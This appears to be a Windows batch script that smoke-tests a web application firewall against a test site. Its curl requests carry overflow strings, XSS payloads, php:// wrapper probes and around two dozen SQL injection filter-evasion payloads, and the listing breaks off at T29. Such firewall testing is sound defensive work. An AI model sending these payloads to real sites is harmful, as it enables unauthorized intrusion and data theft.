:: * 请将“%URL%”为测试网站地址；“%OSlevel%”替换为“系统版本+apache版本”。
:: * 该快速验证模式方便进行各功能的触发，快速冒烟测试。
:: * 被测网址（例如，http://zblog.test.com/ ，末尾已/结束)；
:: * 例如:
:: * singlesite.bat http://192.168.9.208:82/ 9.208-iis6-zblog
@echo off
set URL=%1
set OSlevel=%2
mkdir php
echo * 以下会对【被测网站】%OSlevel%防护相关功能进行快速验证，验证条目为各功能的关键规则。
echo * 请先确认各功能模块均开启，【防盗链】为“引用方式”！！                     
echo * 【多线程下载控制】 开启！！                                         
:start
echo 【被测网址】：%URL%
echo 【系统版本+apache版本给结果文件命名】：%OSlevel%
echo 【结果判定】：                                                                              >.\php\%OSlevel%-all.htm
echo 返回拦截页面测试通过；                                                                      >>.\php\%OSlevel%-all.htm
echo 部分网站会返回空页面，BadRequest或403，均可判定为防护正常；                                 >>.\php\%OSlevel%-all.htm
echo 返回404防护失效。                                                                           >>.\php\%OSlevel%-all.htm
echo 返回其他,请人工筛查对应的请求分析测试结果。                                                                           >>.\php\%OSlevel%-all.htm
echo ---------------------------------------------------------------------------------------------->>.\php\%OSlevel%-all.htm
echo 验证测试网站是否可以正常访问：
echo 1.200 OK则网站访问正常；
echo 2.其他返回信息，可能需人工排查原因:
echo *被测网址是否输入正确？
echo *防火墙是否关闭了？
echo *网络是否正常？
echo *网站服务是否为启动状态?
echo 【以下为服务器返回的状态信息】#########
echo %OSlevel%  >>.\php\%OSlevel%-all.htm
curl -I %URL% 
set "t=%time%"
echo 【#01】 网站防护-网站漏洞防护-右侧-Web服务器溢出攻击防护-URL长度===========[%URL%]================================================================================ >> .\php\%OSlevel%-all.htm
curl %URL%?2100111111111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122222111112222211111222221111122266666666662211111222221111122222111112226666666666  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#02】 网站防护-网站漏洞防护-右侧-Web服务器溢出攻击防护-Cookie长度===========[%URL%]================================================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASP.NET_SessionId=um4vj1jo3n2u0055vggjbwfz192.168.9.18380;ASP.NET_SessionId=um4vj1jo3n2u0055vggj;ASP.NET_SessionId=um4vj1jo3n2u0055vggjbwfz192.168.9.18380.ASPXAUTH8A06FD6C091C681DF607BF60145F7E47CD1D0D1ED360C3C4AFF60611D0E557446F97DCEA9494B64C9A4B26A6B03885FE209AF904DBEC95F54541AAFDD204A8B7F8EF2B161A336A3E02B5858CDBF83D18BB353C6F4200541E221DADBD04E8C0CD3186BC860BDE52B6AAAB02392F5F29C429ABACFF3C6CBD876647D487097B1710C0A9F75FED7473044FB551802C3A3EABDB228F10622F0E4DFD623F921BCFD6F0FDCC40FA40D5FA2DAF7522817F3F6BE97B63C0788C17FC322D0461B9F70FE76C83AC08FE7E365D55938C4AB2DC012CC7E886AC05D9F04AF1A5755FF2ACEDC333F9833E85C99FF984003299DF259A9C4F1B0B7106FE0723A3812D79621015BD82298A91355C93498F02E4C8ACE6639477DA2DF23105C06435A4D25BA95EB4F4E26A71FE5EE7762B91145BBE6EDC62CE39A8BC3E1B5D40ABCA38F23B4DBC208EDEA7DCD92FDA31C75A7527EF56C717AED929149C2F7E91C8DA7D443D8C6011A85A58A864FB4AFC0E3F60EAE85037EEA63A3573AB6C2B87B87485DD36013EA8B77E962EA8EC1FDE2E99CA35607A5DE50C07FFD3AF6203249368893B1DEB428BF137FEF0AADF1A5D489BE51F8FDC0DB321536D3067130C90C1954525276DF76DBDC27DE7BAB47DA4155955B17D536A520E7181474FF404BDE3FA4E8B9880E09EC4F51365EEB8511775435A57076AA1C22452E70D3DDE3436DCB9F20D9F05768B4AA91EC9DCE1182BCC9FCF855C46B403D6612F8B3D887B0628BD2B9DBCD8063A7DF9768C6CD5D6AEAE3C6ED0F435B34B9ABFA11F16C749643A93C4D9B312D6652EE9EFB1AD6A9E012D7B5E933A9319740EE6B5E1C44C51E1A44AE30D8A32277CFF97FF087C56B0AC330DD03D7BF00FE8288F71414C933465B98295C0AAB8CFCFCB9AC2491B4DF5018158FB2B2FA4DB6A20652287168CAE3A987704CF2FE2415C000B40E94420EAEAD7C4CFCC5AFF8FEBFEAC3F9D421DE4BF81A7BB05E07C686E61D459410ACDE5D1D4CA53B145B662CFCDB25EAA324156310E749242649893E6330882F9036469F7686AEE5FAAAE51A8BF761FECD99F5113DA1A61DD1DDFF0721FE17A514774E57A79E2DC3A59886C4827C9719317E961474FDCD170867540E3FEB9C7F3EE1BA6C5533868270AFFF37440E43D3D0CA60355B9B90E131B40A984A2C0CAFA0A72BF139C7DD8B977A472E3F598804CC3B146DB0C60D6C48EFF71CC285E10CC6544A7D4BFBD246D56540758325F7EABABDBB76E9A49995F2395C6BA8DA251715A6A51DC1444F7C7C626020FE1418539C71952DCADABFC7025609980F566194EE9C8DE1B7D0D7DA2923A6772E7A108DAD2DFB1F0490108C2105E9BDC124B0DAB18AADC3DF7C6F74F3343A596ACE518B70E2DC70959FBC27B8EB46821B8FA391C882FBB9E08E319CA039330D3D9AB4E56785D3430B4BB7C8338D6EF2A23355A1BF229335D1AFFA8601500E4146E0196535680AE51024CD5113AB27B9E048E2C367CD17AD1A2139C197D93ED2CB58459DBA6C1EF242FF543AC37F47783B68E9786935241E08CCAE3340373A740B371C6C86B6FFBD58A576DB2B4E40837E6E95957B51039F3645BEAA2D15A41961EEB73E6D8D0C04C7095C6FBD225FA4ADE9D140AF6FE9F61F5A4DC409EF213209FA612DA6CD93EAB7C05441E279448AC2BC4192.168.9.18380.ASPXAUTHIsUserLogOutfalseASP.NET_SessionIdum4vj1jo3n2u0055vggjbwfz192.168.9.18380.ASPXAUTH8A06FD6C091C681DF607BF60145F7E47CD1D0D1ED360C3C4AFF60611D0E557446F97DCEA9494B64C9A4B26A6B03885FE209AF904DBEC95F54541AAFDD204A8B7F8EF2B161A336A3E02B5858CDBF83D18BB353C6F4200541E221DADBD04E8C0CD3186BC860BDE52B6AAAB02392F5F29C429ABACFF3C6CBD876647D487097B1710C0A9F75FED7473044FB551802C3A3EABDB228F10622F0E4DFD623F921BCFD6F0FDCC40FA40D5FA2DAF7522817F3F6BE97B63C0788C17FC322D0461B9F70FE76C83AC08FE7E365D55938C4AB2DC012CC7E886AC05D9F04AF1A5755FF2ACEDC333F9833E85C99FF984003299DF259A9C4F1B0B7106FE0723A3812D79621015BD82298A91355C93498F02E4C8ACE6639477DA2DF23105C06435A4D25BA95EB4F4E26A71FE5EE7762B91145BBE6EDC62CE39A8BC3E1B5D40ABCA38F23B4DBC208EDEA7DCD92FDA31C75A7527EF56C717AED929149C2F7E91C8DA7D443D8C6011A85A58A864FB4AFC0E3F60EAE85037EEA63A3573AB6C2B87B87485DD36013EA8B77E962EA8EC1FDE2E99CA35607A5DE50C07FFD3AF6203249368893B1DEB428BF137FEF0AADF1A5D489BE51F8FDC0DB321536D3067130C90C1954525276DF76DBDC27DE7BAB47DA4155955B17D536A520E7181474FF404BDE3FA4E8B9880E09EC4F51365EEB8511775435A57076AA1C22452E70D3DDE3436DCB9F20D9F05768B4AA91EC9DCE1182BCC9FCF855C46B403D6612F8B3D887B0628BD2B9DBCD8063A7DF9768C6CD5D6AEAE3C6ED0F435B34B9ABFA11F16C749643A93C4D9B312D6652EE9EFB1AD6A9E012D7B5E933A9319740EE6B5E1C44C51E1A44AE30D8A32277CFF97FF087C56B0AC330DD03D7BF00FE8288F71414C933465B98295C0AAB8CFCFCB9AC2491B4DF5018158FB2B2FA4DB6A20652287168CAE3A987704CF2FE2415C000B40E94420EAEAD7C4CFCC5AFF8FEBFEAC3F9D421DE4BF81A7BB05E07C686E61D459410ACDE5D1D4CA53B145B662CFCDB25EAA324154005BFA11F16C749643A93C4D9B312D6652EE9EFB1AD6A9E012D7B5E933A9319740EE6B5E1C44C51E1A44AE30D8A32277CFF97FF087C56B0AC330DD03D7BF00FE8288F71414C933465B98295C0AAB8CFCFCB9AC2491B4DF5018158FB2B2FA4DB6A20652287168CAE3A987704CF2FE2415C000B40E94420EAEAD7C4CFCC5AFF8FEBFEAC3F9D421DE4BF81A7BB05E07C686E61D459410ACDE5D1D4CA53B145B662CFCDB25EAA324154005BFA11F16C749643A93C4D9B312D6652EE9EFB1AD6A9E012D7B5E933A9319740EE6B5E1C44C51E1A44AE30D8A32277CFF97FF087C56B0AC330DD03D7BF00FE8288F71414C933465B98295C0AAB8CFCFCB9AC2491B4DF5018158FB2B2FA4DB6A20652287168CAE3A987704CF2FE2415C000B40E94420EAEAD7C4CFCC5AFF8FEBFEAC3F9D421DE4BF81A7BB05E07C686E61D459410ACDE5D1D4CA53B145B662CFCDB25EAA324154005BFA11F16C749643A93C4D9B312D6652EE9EFB1AD6A9E012D7B5E933A9319740EE6B5E1C44C51E1A44AE30D8A32277CFF97FF087C56B0AC330DD03D7BF00FE8288F71414C933465B98295C0AAB8CFCFCB9AC2491B4DF5018158FB2B2FA4DB6A20652287168CAE3A987704CF2FE2415C000B40E94420EAEAD7C4CFCC5AFF8FEBFEAC3F9D421DE4BF81A7BB05E07C686E61D459410ACDE5D1D4CA53B145B662CFCDB25EAA32415400511" %URL%testlink/testindex.php  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
::echo 【#03】 网站防护-网站漏洞防护-右侧-WEB服务器文件名解析漏洞\apache不做防护======[%URL%]============================================================================================== >> .\php\%OSlevel%-all.htm
::curl %URL%iis6\.asp;\/\iis7.jpg/\iis8.php  >> .\php\%OSlevel%-all.htm
::echo . >> .\php\%OSlevel%-all.htm
echo 【#04】 网站防护-网站漏洞防护-右侧-禁止浏览畸形文件=======[%URL%]==================================================================================================== >> .\php\%OSlevel%-all.htm
curl %URL%com1  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#05】 网站防护-网站漏洞防护-右侧-禁止下载特定类型文件=====[%URL%]================================================================================================== >> .\php\%OSlevel%-all.htm
curl %URL%yunsuo.db  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#06】 网站防护-网站漏洞防护-右侧-禁止其他类型请求========[%URL%]=================================================================================================== >> .\php\%OSlevel%-all.htm
curl --request OPTIONS %URL%testindex.php  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#07-1】 网站防护-敏感内容过滤-GET请求============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl %URL%minganci.txt  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#07-2】 网站防护-敏感内容过滤-POST请求============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl --header "Content-Type:text/html" --data-urlencode "反对共产党" %URL%testindex.php   >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#08】 网站防护-网站漏洞防护-漏洞攻击防护-禁止使用data URI schema========[%URL%]=================================================================================================== >> .\php\%OSlevel%-all.htm
curl -b "phpSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;" %URL%?data:text/plain,%%3C?   >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#09】 网站防护-网站漏洞防护-漏洞攻击防护-禁止使用data URI schema解密base64编码========[%URL%]================================================================ >> .\php\%OSlevel%-all.htm
curl -b "phpSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;" %URL%?data:text/plain;base64  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#10】 网站防护-网站漏洞防护-漏洞攻击防护-禁止使用php://filter=============[%URL%]=========================================================== >> .\php\%OSlevel%-all.htm
curl -b "phpSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;" %URL%?php://filter/sdf   >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#11】 网站防护-网站漏洞防护-漏洞攻击防护-禁止使用php://input==============[%URL%]========================================================== >> .\php\%OSlevel%-all.htm
curl -b "phpSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;" %URL%?php://input/sdf  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#12】 网站防护-网站漏洞防护-SQL注入防护-cookie防护-GET请求-防止对数据库进行删除创建表操作========[%URL%]================================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;exec  from" %URL%testindex.php  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#13】 网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-防止对数据库进行删除创建表操作============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;" %URL%?create+table+ssss  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#14】 网站防护-网站漏洞防护-SQL注入防护-漏洞防护-POST请求-防止对数据库进行删除创建表操作====[%URL%]==================================================================== >> .\php\%OSlevel%-all.htm
curl --header "Content-Type:text/html" -d " create+table+ssss " %URL%testindex.php  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#15】 网站防护-网站漏洞防护-XSS攻击防护-cookie防护-防止BASE标签内JS类型的XSS============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;<BASE HREF="javascript:alert('XSS');//">" %URL%testindex.php >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#16】 网站防护-网站漏洞防护-XSS攻击防护-POST防护防止BASE标签内JS类型的XSS============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl  --header "Content-Type:application/x-www-form-urlencoded" -d "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;<BASE HREF="javascript:alert('XSS');//">" %URL%testindex.php >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#17】 网站防护-防盗链防护-引用方式+会话方式=========[%URL%]=============================================================== >> .\php\%OSlevel%-all.htm
curl -b yunsuo_leech_key=2227012320 --referer http://192.168.1.118 %URL%leech/jpg/图片/1/张歆艺的1.jpg图片/1.avi.jpg >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#17-2】 网站防护-防盗链防护-引用方式+会话方式-非法引用资源=========[http://test.leech.%URL:~19%]=============================================================== >> .\php\%OSlevel%-all.htm
curl -b yunsuo_leech_key=2227012320 --referer http://test.leech.%URL:~20% %URL%leech/jpg/图片/1/张歆艺的1.jpg图片/1.avi.png >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#R1】后台防护==========原始后台地址[%URL%db/login.php]-返回404-------------------- >> .\php\%OSlevel%-all.htm
curl %URL%db/login.php >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#R2】后台防护==========原始后台地址[%URL%1.php]-返回302原始地址-------------------- >> .\php\%OSlevel%-all.htm
curl %URL%1.php >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm

echo 【#T1】 网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-用utf8代替引号============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%271AND+%%EF%%BC%%871%%EF%%BC%%87=%%EF%%BC%%871%%27 >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T2】 网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-like 代替等号============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=SELECT+*+FROM+users+WHERE+id+LIKE+1 >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T3】 网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%271--nVNaVoPYeva%%0AAND--ngNvzqu%%0A9227=9227%%27 >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T4】 网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-绕过过滤’>’ ,用GREATEST替换大于号 ===========[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%271%%20AND%%20GREATEST(A,B+1)=A%%27 >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T5】 网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%22value%%27/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND+%%27QDWa%%27=%%27QDWa%%22 >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T6】 网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-空格替换为 #号 以及更多随机字符串 换行符============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=1%%23PTTmJopxdWJ%%0AAND%%23cWfcVRPV%%0A9227=9227 >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T7】 网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-在有效负荷结束位置加载零字节字符编码。============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%271+AND+1=1%%00%%27 >> .\php\%OSlevel%-all.htm 
echo . >> .\php\%OSlevel%-all.htm
::echo 【#T8】 网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-绕过对 IFNULL 过滤。替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
::curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%27IF(ISNULL(1),2,1)%%27 >> .\php\%OSlevel%-all.htm
::echo . >> .\php\%OSlevel%-all.htm
echo 【#T9】 网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-空格替换为其它空符号============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=SELECT%%08id%%02FROM%%0Fusers >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
::echo 【#T10】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-用base64编码替换============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
::curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%27MScgQU5EIFNMRUVQKDUpIw==%%27  >> .\php\%OSlevel%-all.htm
::echo . >> .\php\%OSlevel%-all.htm
echo 【#T11】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-替换空格============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%271%%23%%0AAND%%23%%0A9227=9227%%27 >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T12】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-空格替换其它空白符号(mysql)============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=SELECT%%0Bid%%0BFROM%%A0users >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
::echo 【#T13】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-用between替换大于号（>）============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
::curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%271+AND+A+NOT+BETWEEN+0+AND+B--%%27  >> .\php\%OSlevel%-all.htm
::echo . >> .\php\%OSlevel%-all.htm
::echo 【#T14】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-包含了完整的查询与零版本注释============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
::curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%271+/*!00000AND+2&gt;1*/--%%27  >> .\php\%OSlevel%-all.htm
::echo . >> .\php\%OSlevel%-all.htm
echo 【#T15】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%271--%%0AAND--%%0A9227=9227%%27 >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T16】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-围绕SQL关键字添加多个空格============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%271++++UNION+++++SELECT+++++foobar%%27  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T17】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-用+替换空格============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%27SELECT+id+FROM+users%%27  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T18】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-代替空格字符后与一个有效的随机空白字符的SQL语句。然后替换=为like============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%27SELECT%%09id+FROM+users+where+id+LIKE+1%%27  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
::echo 【#T19】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-双重查询语句。取代predefined SQL关键字with表示 suitable for替代============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
::curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%271+UNIOUNIONN+SELESELECTCT+2--%%27  >> .\php\%OSlevel%-all.htm
::echo . >> .\php\%OSlevel%-all.htm
echo 【#T20】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-代替空格字符（“”）从一个随机的空白字符可选字符的有效集============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%27SELECT%%0Did%%0DFROM%%0Ausers%%27  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T21】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-asp允许每个字符前面添加一个百分号 ============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%S%%E%%L%%E%%C%%T+%%F%%I%%E%%L%%D+%%F%%R%%O%%M+%%T%%A%%B%%L%%E  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T22】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%271+AND+9227=9227--+sp_password%%27  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
::echo 【#T23】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-双url编码(不处理以编码的)============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
::curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%2553%%2545%%254c%%2545%%2543%%2554%%2520%%2546%%2549%%2545%%254c%%2544%%2520%%2546%%2552%%254f%%254d%%2520%%2554%%2541%%2542%%254c%%2545  >> .\php\%OSlevel%-all.htm
::echo . >> .\php\%OSlevel%-all.htm
echo 【#T24】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-替换UNION ALL SELECT UNION SELECT============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%27-1+UNION+SELECT%%27 >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
::echo 【#T25】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-url编码============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
::curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%53%%45%%4c%%45%%43%%54%%20%%46%%49%%45%%4c%%44%%20%%46%%52%%4f%%4d%%20%%54%%41%%42%%4c%%45  >> .\php\%OSlevel%-all.htm
::echo . >> .\php\%OSlevel%-all.htm 
::echo 【#T26】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-用/**/分割sql关键字============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
::curl %URL%?q=%%27INSERT%%27+becomes+%%27IN//S//ERT%%27  >> .\php\%OSlevel%-all.htm
echo 【#T26】网站防护-网站漏洞防护-SQL注入防护-url防护-post请求-url编码============[%URL%]============================================================ >> .\%OSlevel%-all.htm
curl -d "q=%%53%%45%%4c%%45%%43%%54%%20%%46%%49%%45%%4c%%44%%20%%46%%52%%4f%%4d%%20%%54%%41%%42%%4c%%45" %URL%  >> .\%OSlevel%-all.htm
echo . >> .\%OSlevel%-all.htm
::echo . >> .\php\%OSlevel%-all.htm
echo 【#T27】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-宽字符绕过 GPC  addslashes============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=1%%bf%%27+AND+1=1-%%20  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
::echo 【#T28】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-用/**/分割sql关键字============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
::curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%27INSERT%%27+becomes+%%27IN//S//ERT%%27  >> .\php\%OSlevel%-all.htm
::echo . >> .\php\%OSlevel%-all.htm
echo 【#T29】网站防护-网站漏洞防护-SQL注入防护-url防护-字符串 unicode 编码============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
